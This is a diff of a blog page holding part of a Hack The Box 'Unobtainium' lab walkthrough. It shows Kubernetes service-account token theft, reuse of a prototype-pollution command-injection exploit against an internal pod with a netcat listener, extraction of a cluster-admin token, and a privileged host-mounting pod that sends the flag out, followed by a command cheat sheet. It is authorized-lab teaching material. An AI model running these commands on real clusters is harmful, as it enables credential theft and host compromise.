 <p><strong>We're root... inside a container.</strong> <code>hostname</code> shows something like <code>webapp-deployment-9546bc7cb-6r7sq</code>. This is a Kubernetes pod name.</p>
@@ -304,14 +310,14 @@ export TERM=xterm
 <p>When you get a shell and you're root but it doesn't feel like a real host, you're in a container. Containers have limited access to the host, but they often have <strong>service account tokens</strong> for the orchestrator (Kubernetes).</p>
 <p><strong>Rule:</strong> Check <code>/run/secrets/kubernetes.io/serviceaccount/</code> in containers.</p>
 <h3 id="step-7-1-find-the-service-account-token">Step 7.1: Find the Service Account Token</h3>
-<pre><code class="language-bash" data-language="bash">ls -la /run/secrets/kubernetes.io/serviceaccount/
+<pre tabindex="0" aria-label="bash code or terminal block 28"><code class="language-bash" data-language="bash">ls -la /run/secrets/kubernetes.io/serviceaccount/
 cat /run/secrets/kubernetes.io/serviceaccount/namespace
 # default
 cat /run/secrets/kubernetes.io/serviceaccount/token
 </code></pre>
 <p><strong>This JWT token is our key to the Kubernetes API.</strong></p>
 <h3 id="step-7-2-test-api-access">Step 7.2: Test API Access</h3>
-<pre><code class="language-bash" data-language="bash">APISERVER=https://10.129.136.226:8443
+<pre tabindex="0" aria-label="bash code or terminal block 29"><code class="language-bash" data-language="bash">APISERVER=https://10.129.136.226:8443
 SERVICEACCOUNT=/run/secrets/kubernetes.io/serviceaccount
 TOKEN=$(cat ${SERVICEACCOUNT}/token)
 CACERT=${SERVICEACCOUNT}/ca.crt
@@ -320,7 +326,7 @@ curl -k --header "Authorization: Bearer ${TOKEN}" ${APISERVER}/api
 </code></pre>
 <p><strong>Why the external IP?</strong> The internal cluster IP (<code>10.96.0.1</code>) timed out from our pod. But the Kubernetes API is also exposed externally on port 8443. The service account token works against both.</p>
 <h3 id="step-7-3-enumerate-namespaces-and-pods">Step 7.3: Enumerate Namespaces and Pods</h3>
-<pre><code class="language-bash" data-language="bash"># List namespaces
+<pre tabindex="0" aria-label="bash code or terminal block 30"><code class="language-bash" data-language="bash"># List namespaces
 curl -k --header "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces
 
 # List pods in dev namespace
@@ -339,10 +345,10 @@ curl -k --header "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces
 <h3 id="the-strategy">The Strategy</h3>
 <p>We have network access to the dev pods from our webapp container (same cluster network). The dev pods run the same Node.js app on port 3000. We will <strong>re-use the exact same exploit</strong> against an internal IP.</p>
 <h3 id="step-8-1-start-another-listener">Step 8.1: Start Another Listener</h3>
-<pre><code class="language-bash" data-language="bash">nc -lnvp 4444
+<pre tabindex="0" aria-label="bash code or terminal block 31"><code class="language-bash" data-language="bash">nc -lnvp 4444
 </code></pre>
 <h3 id="step-8-2-exploit-the-internal-dev-pod">Step 8.2: Exploit the Internal Dev Pod</h3>
-<pre><code class="language-bash" data-language="bash">curl -s -X PUT http://10.42.0.64:3000/ \
+<pre tabindex="0" aria-label="bash code or terminal block 32"><code class="language-bash" data-language="bash">curl -s -X PUT http://10.42.0.64:3000/ \
   -H "Content-Type: application/json" \
   -d '{"auth": {"name": "felamos", "password": "REDACTED"}, "message": {"test": "x", "__proto__": {"canUpload": true}}}' \
 &amp;&amp; curl -s -X POST http://10.42.0.64:3000/upload \
@@ -357,7 +363,7 @@ curl -k --header "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces
 <p>Each pod has its own service account token with different Kubernetes RBAC permissions. The webapp container's token was limited. The dev container's token might have more access.</p>
 <p><strong>Rule:</strong> re-enumerate Kubernetes permissions from every new container.</p>
 <h3 id="step-9-1-check-permissions-from-dev-container">Step 9.1: Check Permissions from Dev Container</h3>
-<pre><code class="language-bash" data-language="bash">TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+<pre tabindex="0" aria-label="bash code or terminal block 33"><code class="language-bash" data-language="bash">TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 
 # Can we list secrets in kube-system?
 curl -k --header "Authorization: Bearer ${TOKEN}" \
@@ -365,13 +371,13 @@ curl -k --header "Authorization: Bearer ${TOKEN}" \
 </code></pre>
 <p><strong>BREAKTHROUGH:</strong> We can list secrets in <code>kube-system</code>! Among them is <code>c-admin-token-b47f7</code>.</p>
 <h3 id="step-9-2-extract-the-admin-token">Step 9.2: Extract the Admin Token</h3>
-<pre><code class="language-bash" data-language="bash">ADMIN_TOKEN=$(curl -k --header "Authorization: Bearer ${TOKEN}" \
+<pre tabindex="0" aria-label="bash code or terminal block 34"><code class="language-bash" data-language="bash">ADMIN_TOKEN=$(curl -k --header "Authorization: Bearer ${TOKEN}" \
   https://10.129.136.226:8443/api/v1/namespaces/kube-system/secrets/c-admin-token-b47f7 \
   | grep -o '"token": "[^"]*"' | cut -d'"' -f4 | base64 -d)
 </code></pre>
 <p><strong>Why base64 decode?</strong> Kubernetes stores secret values base64-encoded in the API response.</p>
 <h3 id="step-9-3-verify-admin-access">Step 9.3: Verify Admin Access</h3>
-<pre><code class="language-bash" data-language="bash">curl -k --header "Authorization: Bearer ${ADMIN_TOKEN}" \
+<pre tabindex="0" aria-label="bash code or terminal block 35"><code class="language-bash" data-language="bash">curl -k --header "Authorization: Bearer ${ADMIN_TOKEN}" \
   https://10.129.136.226:8443/api/v1/namespaces/kube-system/pods
 </code></pre>
 <p><strong>Result:</strong> Full pod listing. This token has <strong>cluster-admin</strong> privileges.</p>
@@ -380,11 +386,11 @@ curl -k --header "Authorization: Bearer ${TOKEN}" \
 <h3 id="the-strategy-2">The Strategy</h3>
 <p>With cluster-admin access, we can create a <strong>privileged pod</strong> that mounts the host's root filesystem (<code>/</code>). This is the standard Kubernetes container escape technique.</p>
 <h3 id="step-10-1-start-a-listener-for-the-flag">Step 10.1: Start a Listener for the Flag</h3>
-<pre><code class="language-bash" data-language="bash">nc -lnvp 5555
+<pre tabindex="0" aria-label="bash code or terminal block 36"><code class="language-bash" data-language="bash">nc -lnvp 5555
 </code></pre>
 <h3 id="step-10-2-create-the-malicious-pod">Step 10.2: Create the Malicious Pod</h3>
 <p>We POST a Pod spec directly to the Kubernetes API:</p>
-<pre><code class="language-bash" data-language="bash">curl -k --header "Authorization: Bearer ${ADMIN_TOKEN}" \
+<pre tabindex="0" aria-label="bash code or terminal block 37"><code class="language-bash" data-language="bash">curl -k --header "Authorization: Bearer ${ADMIN_TOKEN}" \
   -H "Content-Type: application/json" \
   -X POST \
   https://10.129.136.226:8443/api/v1/namespaces/kube-system/pods \
@@ -434,7 +440,7 @@ curl -k --header "Authorization: Bearer ${TOKEN}" \
 </ul>
 <h3 id="step-10-3-catch-the-flag">Step 10.3: Catch the Flag</h3>
 <p>On our listener:</p>
-<pre><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.136.226] 43122
+<pre tabindex="0" aria-label="Code or terminal block 38"><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.136.226] 43122
 d1a073[redacted]bc323f9f17
 </code></pre>
 <p><strong>Root flag:</strong> <code>d1a073a[redacted]323f9f17</code></p>
@@ -465,7 +471,7 @@ d1a073[redacted]bc323f9f17
 <p>When creating Kubernetes pods for escape, use images already cached on the node (<code>kubectl get pods -o yaml | grep image:</code>). The target likely has no outbound internet.</p>
 <hr>
 <h2 id="commands-cheat-sheet">Commands Cheat Sheet</h2>
-<pre><code class="language-bash" data-language="bash"># Recon
+<pre tabindex="0" aria-label="bash code or terminal block 39"><code class="language-bash" data-language="bash"># Recon
 nmap -p- --min-rate 10000 10.129.136.226
 nmap -p 22,80,8443,31337 -sCV 10.129.136.226
 
@@ -499,9 +505,9 @@ curl -k --header "Authorization: Bearer ${ADMIN_TOKEN}" -H "Content-Type: applic
   -X POST https://10.129.136.226:8443/api/v1/namespaces/kube-system/pods \
   -d '{...pod spec...}'
 </code></pre>
-<hr>6:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$c"}}]
-7:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-tenet-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Tenet Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:06:01.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-unicode-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Unicode Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:00:04.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
-8:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$Ld",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
-e:T5b8,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-unobtainium-walkthrough/#article","headline":"Hack The Box: Unobtainium Walkthrough","description":"Electron client secrets and a file-read endpoint exposed the Node.js source, where prototype pollution unlocked a command-injection upload for a pod shell; reusing it against a dev pod yielded a cluster-admin token and a privileged host-mounted pod.","url":"https://cyberkareem.com/writing/hackthebox-unobtainium-walkthrough/","datePublished":"2026-06-11T11:03:50.000Z","dateModified":"2026-06-11T11:03:50.000Z","wordCount":2712,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/96c70e045fff8d0d14702715a7528e2afe4f8ed2/HTB-Unobtainium.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-unobtainium-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-unobtainium-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Unobtainium Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-unobtainium-walkthrough/"}]}]}9:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$e"}}]
-a:["$","$Lf",null,{"children":["$","$10",null,{"name":"Next.MetadataOutlet","children":"$@11"}]}]
-11:null
+<hr>c:["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","data-motion":"fade","children":[["$","$L11",null,{"headings":[{"id":"attack-chain","label":"Attack chain"},{"id":"phase-1-reconnaissance","label":"Phase 1: Reconnaissance"},{"id":"phase-2-the-electron-app-and-source-recovery","label":"Phase 2: The Electron App & Source Recovery"},{"id":"phase-3-api-enumeration-and-source-analysis","label":"Phase 3: API Enumeration & Source Analysis"},{"id":"phase-4-prototype-pollution-explained","label":"Phase 4: Prototype Pollution Explained"},{"id":"phase-5-command-injection-explained","label":"Phase 5: Command Injection Explained"},{"id":"phase-6-initial-foothold-user-flag","label":"Phase 6: Initial Foothold (User Flag)"},{"id":"phase-7-kubernetes-enumeration","label":"Phase 7: Kubernetes Enumeration"},{"id":"phase-8-lateral-movement-to-dev-container","label":"Phase 8: Lateral Movement to Dev Container"},{"id":"phase-9-privilege-escalation-via-kubernetes","label":"Phase 9: Privilege Escalation via Kubernetes"},{"id":"phase-10-root-flag","label":"Phase 10: Root Flag"},{"id":"key-lessons-and-takeaways","label":"Key Lessons & Takeaways"},{"id":"commands-cheat-sheet","label":"Commands Cheat Sheet"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/96c70e045fff8d0d14702715a7528e2afe4f8ed2/HTB-Unobtainium.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 96c70e045fff",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Unobtainium, Linux, Hard",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/unobtainium","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"13 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]]]}],["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$12"}}]]}]
+d:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-tenet-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Tenet Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:06:01.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-unicode-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Unicode Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:00:04.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
+e:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L13",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
+14:T5b8,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-unobtainium-walkthrough/#article","headline":"Hack The Box: Unobtainium Walkthrough","description":"Electron client secrets and a file-read endpoint exposed the Node.js source, where prototype pollution unlocked a command-injection upload for a pod shell; reusing it against a dev pod yielded a cluster-admin token and a privileged host-mounted pod.","url":"https://cyberkareem.com/writing/hackthebox-unobtainium-walkthrough/","datePublished":"2026-06-11T11:03:50.000Z","dateModified":"2026-06-11T11:03:50.000Z","wordCount":2712,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/96c70e045fff8d0d14702715a7528e2afe4f8ed2/HTB-Unobtainium.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-unobtainium-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-unobtainium-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Unobtainium Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-unobtainium-walkthrough/"}]}]}f:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
+10:["$","$L15",null,{"children":["$","$16",null,{"name":"Next.MetadataOutlet","children":"$@17"}]}]
+17:null
